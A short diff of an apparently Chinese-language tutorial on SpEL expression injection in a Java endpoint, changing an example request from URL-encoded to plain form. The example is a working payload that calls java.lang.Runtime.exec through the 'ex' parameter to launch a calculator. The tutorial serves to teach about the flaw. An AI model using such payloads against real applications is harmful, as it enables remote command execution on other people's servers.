@@ -64,7 +64,7 @@ public String spelVul(String ex) {
 
 执行下系统命令
 ```
-/vul?ex=T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)
+/vul?ex=T(java.lang.Runtime).getRuntime().exec("open -a Calculator")
 ```
 
 > T(Type): 使用“T(Type)”来表示java.lang.Class实例，同样，只有 java.lang 下的类才可以省略包名
